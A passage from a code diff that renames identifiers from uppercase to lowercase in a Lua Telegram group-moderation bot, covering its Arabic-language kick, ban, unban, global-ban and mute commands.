+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:ban"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
+return "flash"
 end
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH_res = user_info_ if user_info_ then
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash_res = user_info_ if user_info_ then
 if is_momod(res[2], msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع حظر ، '..FLASH_renk(res[2], msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع حظر ، '..flash_renk(res[2], msg.chat_id_), 1, 'md')
 else
-FLASHdx1:sadd(FLASH..'bot:banned:'..msg.chat_id_, res[2])
+flashdx1:sadd(flash..'bot:banned:'..msg.chat_id_, res[2])
 chat_kick(msg.chat_id_, res[2])
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم ( حظره ) من المجموعه ،*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم ( حظره ) من المجموعه ،*', 1, 'md')
 end end end
---     By Developer FLASH     -- 
-if text:match("^طرد$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^طرد$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 function kick_reply(extra, result, success)
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:ban"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:ban"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
+return "flash"
 end
 if is_momod(result.sender_user_id_, result.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع طرد ، '..FLASH_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع طرد ، '..flash_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم طرده بنجاح𓍢\n")
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم طرده بنجاح𓍢\n")
 chat_kick(result.chat_id_, result.sender_user_id_)
 end end
 getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
 end
---     By Developer FLASH     -- 
-if text and text:match("^طرد @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-local FLASH_res = {string.match(text, "^(طرد) @(.*)$")}
+--     By Developer flash     -- 
+if text and text:match("^طرد @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+local flash_res = {string.match(text, "^(طرد) @(.*)$")}
 function ban_by_username(extra, result, success)
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:ban"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:ban"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
+return "flash"
 end
 if result.id_ then
 if is_momod(result.id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع طرد ، '..FLASH_renk(result.id_, msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع طرد ، '..flash_renk(result.id_, msg.chat_id_), 1, 'md')
 else
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم طرده بنجاح𓍢\n")
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم طرده بنجاح𓍢\n")
 chat_kick(msg.chat_id_, result.id_)
 end end end
-resolve_username(FLASH_res[2],ban_by_username)
+resolve_username(flash_res[2],ban_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^طرد (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^طرد (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local res = {string.match(text, "^(طرد) (%d+)$")}
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:ban"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:ban"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الطرد او الحظر ، \n❅∫ لانه معطل من قبل المنشئ . ', 1, 'md')
+return "flash"
 end
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH_res = user_info_ if user_info_ then
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash_res = user_info_ if user_info_ then
 if is_momod(res[2], msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع طرد ، '..FLASH_renk(res[2], msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع طرد ، '..flash_renk(res[2], msg.chat_id_), 1, 'md')
 else
 chat_kick(msg.chat_id_, res[2])
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم ( طرده ) من المجموعه ،*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم ( طرده ) من المجموعه ،*', 1, 'md')
 end end end
---     By Developer FLASH     -- 
-if text:match("^الغاء حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-function FLASH(extra, result, success)
+--     By Developer flash     -- 
+if text:match("^الغاء حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+function flash(extra, result, success)
 function unban_by_reply(extra, result, success)
-local FLASH = 'bot:banned:'..msg.chat_id_
-if not FLASHdx1:sismember(FLASH..FLASH, result.sender_user_id_) then
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ لم يتم حظره سابقا𓍢\n")
+local flash = 'bot:banned:'..msg.chat_id_
+if not flashdx1:sismember(flash..flash, result.sender_user_id_) then
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ لم يتم حظره سابقا𓍢\n")
 else  
-FLASHdx1:srem(FLASH..FLASH, result.sender_user_id_)
+flashdx1:srem(flash..flash, result.sender_user_id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء حظره𓍢\n")
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء حظره𓍢\n")
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
 end
-channel_get_kicked(msg.chat_id_,FLASH)
+channel_get_kicked(msg.chat_id_,flash)
 end 
---     By Developer FLASH     -- 
-if text:match("^الغاء حظر @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الغاء حظر @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local res = {string.match(text, "^(الغاء حظر) @(.*)$")}
 function unban_by_username(extra, result, success)
 if result.id_ then
-if not FLASHdx1:sismember(FLASH..'bot:banned:'..msg.chat_id_, result.id_) then
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ لم يتم حظره سابقا𓍢\n")
+if not flashdx1:sismember(flash..'bot:banned:'..msg.chat_id_, result.id_) then
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ لم يتم حظره سابقا𓍢\n")
 else 
-FLASHdx1:srem(FLASH..'bot:banned:'..msg.chat_id_, result.id_)
+flashdx1:srem(flash..'bot:banned:'..msg.chat_id_, result.id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء حظره𓍢\n")
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء حظره𓍢\n")
 end else 
 text = '❅∫ *المعرف غير صحيح*'
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
 resolve_username(res[2],unban_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^الغاء حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الغاء حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local res = {string.match(text, "^(الغاء حظر) (%d+)$")}
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH_res = user_info_ if user_info_ then
-if not FLASHdx1:sismember(FLASH..'bot:banned:'..msg.chat_id_, res[2]) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *لم يتم ( حظره ) سابقا*', 1, 'md')
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash_res = user_info_ if user_info_ then
+if not flashdx1:sismember(flash..'bot:banned:'..msg.chat_id_, res[2]) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *لم يتم ( حظره ) سابقا*', 1, 'md')
 else 
-FLASHdx1:srem(FLASH..'bot:banned:'..msg.chat_id_, res[2])
+flashdx1:srem(flash..'bot:banned:'..msg.chat_id_, res[2])
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = res[2] , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *المحظور* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم ( الغاء حظره ) ،*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *المحظور* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم ( الغاء حظره ) ،*', 1, 'md')
 end end end
---     By Developer FLASH     -- 
-if text:match("^حظر عام$") and is_sudo(msg) and msg.reply_to_message_id_ and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^حظر عام$") and is_sudo(msg) and msg.reply_to_message_id_ and flash11(msg) then
 function gban_by_reply(extra, result, success)
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
-local FLASH = 'bot:gban:'
+local gps = flashdx1:scard(flash.."bot:groups")
+local flash = 'bot:gban:'
 if is_leaderid(result.sender_user_id_) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
 return false 
 end
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم حظره من "..gps.." مجموعه𓍢\n")
-FLASHdx1:sadd(FLASH..FLASH, result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم حظره من "..gps.." مجموعه𓍢\n")
+flashdx1:sadd(flash..flash, result.sender_user_id_)
 chat_kick(result.chat_id_, result.sender_user_id_)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
 end
---     By Developer FLASH     -- 
-if text and text:match("^حظر عام @(.*)$") and is_sudo(msg) and FLASH11(msg) then
-local FLASH_res = {string.match(text, "^(حظر عام) @(.*)$")}
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
+--     By Developer flash     -- 
+if text and text:match("^حظر عام @(.*)$") and is_sudo(msg) and flash11(msg) then
+local flash_res = {string.match(text, "^(حظر عام) @(.*)$")}
+local gps = flashdx1:scard(flash.."bot:groups")
 function gban_by_username(extra, result, success)
 if result.id_ then
 if is_leaderid(result.id_) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
 return false 
 end
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم حظره من "..gps.." مجموعه𓍢\n")
-FLASHdx1:sadd(FLASH..'bot:gban:', result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم حظره من "..gps.." مجموعه𓍢\n")
+flashdx1:sadd(flash..'bot:gban:', result.id_)
 chat_kick(msg.chat_id_, result.id_)
 end end
-resolve_username(FLASH_res[2],gban_by_username)
+resolve_username(flash_res[2],gban_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^حظر عام (%d+)$") and is_sudo(msg) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^حظر عام (%d+)$") and is_sudo(msg) and flash11(msg) then
 local res = {string.match(text, "^(حظر عام) (%d+)$")}
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH = 'bot:gban:'
-local FLASH_res = user_info_ if user_info_ then
+local gps = flashdx1:scard(flash.."bot:groups")
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash = 'bot:gban:'
+local flash_res = user_info_ if user_info_ then
 if is_leaderid(res[2]) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
 return false 
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
 end
-FLASHdx1:sadd(FLASH..FLASH, res[2])
+flashdx1:sadd(flash..flash, res[2])
 chat_kick(msg.chat_id_, res[2])
 end
---     By Developer FLASH     -- 
-if text:match("^الغاء العام$") and is_sudo(msg) and msg.reply_to_message_id_ and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الغاء العام$") and is_sudo(msg) and msg.reply_to_message_id_ and flash11(msg) then
 function ungban_by_reply(extra, result, success)
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_ if user_info_ then
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء حظره ، كتمه من "..gps.." مجموعه𓍢\n")
+local gps = flashdx1:scard(flash.."bot:groups")
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_ if user_info_ then
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء حظره ، كتمه من "..gps.." مجموعه𓍢\n")
 end
-FLASHdx1:srem(FLASH..'bot:gban:', result.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:mutedall:', result.sender_user_id_)
+flashdx1:srem(flash..'bot:gban:', result.sender_user_id_)
+flashdx1:srem(flash..'bot:mutedall:', result.sender_user_id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
 end
---     By Developer FLASH     -- 
-if text:match("^الغاء العام @(.*)$") and is_sudo(msg) and FLASH11(msg) then
-local FLASH_res = {string.match(text, "^(الغاء العام) @(.*)$")}
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
+--     By Developer flash     -- 
+if text:match("^الغاء العام @(.*)$") and is_sudo(msg) and flash11(msg) then
+local flash_res = {string.match(text, "^(الغاء العام) @(.*)$")}
+local gps = flashdx1:scard(flash.."bot:groups")
 function ungban_by_username(extra, result, success)
 if result.id_ then
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء حظره ، كتمه من "..gps.." مجموعه𓍢\n")
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء حظره ، كتمه من "..gps.." مجموعه𓍢\n")
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)
-FLASHdx1:srem(FLASH..'bot:gban:', result.id_)
-FLASHdx1:srem(FLASH..'bot:mutedall:', result.id_)
+flashdx1:srem(flash..'bot:gban:', result.id_)
+flashdx1:srem(flash..'bot:mutedall:', result.id_)
 end end 
-resolve_username(FLASH_res[2],ungban_by_username)
+resolve_username(flash_res[2],ungban_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^الغاء العام (%d+)$") and is_sudo(msg) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الغاء العام (%d+)$") and is_sudo(msg) and flash11(msg) then
 local res = {string.match(text, "^(الغاء العام) (%d+)$")}
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH_res = user_info_ if user_info_ then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم الغاء حظره ، كتمه من ( '..gps..' ) مجموعه*', 1, 'md')
-FLASHdx1:srem(FLASH..'bot:gban:', res[2])
-FLASHdx1:srem(FLASH..'bot:mutedall:', res[2])
+local gps = flashdx1:scard(flash.."bot:groups")
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash_res = user_info_ if user_info_ then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم الغاء حظره ، كتمه من ( '..gps..' ) مجموعه*', 1, 'md')
+flashdx1:srem(flash..'bot:gban:', res[2])
+flashdx1:srem(flash..'bot:mutedall:', res[2])
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = ap[2] , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 end end
---     By Developer FLASH     -- 
-if text:match("^كتم عام$") and is_sudo(msg) and msg.reply_to_message_id_ and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^كتم عام$") and is_sudo(msg) and msg.reply_to_message_id_ and flash11(msg) then
 function muteall_by_reply(extra, result, success)
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_ if user_info_ then
+local gps = flashdx1:scard(flash.."bot:groups")
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_ if user_info_ then
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '•*لا تستطيع كتمي*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '•*لا تستطيع كتمي*', 1, 'md')
 return false 
 end 
 if is_leaderid(result.sender_user_id_) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
 return false 
 end
-FLASHdx1:sadd(FLASH..'bot:mutedall:', result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم كتمه في "..gps.." مجموعه𓍢\n")
+flashdx1:sadd(flash..'bot:mutedall:', result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم كتمه في "..gps.." مجموعه𓍢\n")
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,muteall_by_reply)
 end
---     By Developer FLASH     -- 
-if text and text:match("^كتم عام @(.*)$") and is_sudo(msg) and FLASH11(msg) then
-local FLASH_res = {string.match(text, "^(كتم عام) @(.*)$")}
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
+--     By Developer flash     -- 
+if text and text:match("^كتم عام @(.*)$") and is_sudo(msg) and flash11(msg) then
+local flash_res = {string.match(text, "^(كتم عام) @(.*)$")}
+local gps = flashdx1:scard(flash.."bot:groups")
 function muteall_by_username(extra, result, success)
 if result.id_ then
 if is_leaderid(result.id_) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
 return false 
 end
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم كتمه في "..gps.." مجموعه𓍢\n")
-FLASHdx1:sadd(FLASH..'bot:mutedall:', result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم كتمه في "..gps.." مجموعه𓍢\n")
+flashdx1:sadd(flash..'bot:mutedall:', result.id_)
 end end
-resolve_username(FLASH_res[2],muteall_by_username)
+resolve_username(flash_res[2],muteall_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^كتم عام (%d+)$") and is_sudo(msg) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^كتم عام (%d+)$") and is_sudo(msg) and flash11(msg) then
 local res = {string.match(text, "^(كتم عام) (%d+)$")}
-local gps = FLASHdx1:scard(FLASH.."bot:groups")
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH_res = user_info_ if user_info_ then
+local gps = flashdx1:scard(flash.."bot:groups")
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash_res = user_info_ if user_info_ then
 if is_leaderid(res[2]) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
 return false 
 end
-FLASHdx1:sadd(FLASH..'bot:mutedall:', res[2])
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم كتمه في ( '..gps..' ) مجموعه*', 1, 'md')
+flashdx1:sadd(flash..'bot:mutedall:', res[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم كتمه في ( '..gps..' ) مجموعه*', 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 function mute_by_reply(extra, result, success)
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:banmu"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الكتم او التقييد \n❅∫ لانه معطل من قبل المنشئ ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:banmu"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الكتم او التقييد \n❅∫ لانه معطل من قبل المنشئ ', 1, 'md')
+return "flash"
 end
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *لا تستطيع كتمي*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *لا تستطيع كتمي*', 1, 'md')
 return false 
 end 
 if is_momod(result.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..FLASH_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..flash_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else 
-FLASHdx1:sadd(FLASH..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم  كتمه𓍢\n")
+flashdx1:sadd(flash..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم  كتمه𓍢\n")
 end end 
 getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
 end
---     By Developer FLASH     -- 
-if text:match('^كتم @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-local FLASH_res = {string.match(text, '^(كتم) @(.*)$')}
+--     By Developer flash     -- 
+if text:match('^كتم @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+local flash_res = {string.match(text, '^(كتم) @(.*)$')}
 function mute_by_username(extra, result, success)
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:banmu"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الكتم او التقييد \n❅∫ لانه معطل من قبل المنشئ ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:banmu"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الكتم او التقييد \n❅∫ لانه معطل من قبل المنشئ ', 1, 'md')
+return "flash"
 end
-local FLASH = 'bot:muted:'..msg.chat_id_
+local flash = 'bot:muted:'..msg.chat_id_
 if result.id_ then 
 if is_momod(result.id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..FLASH_renk(result.id_, msg.chat_id_), 1, 'md')
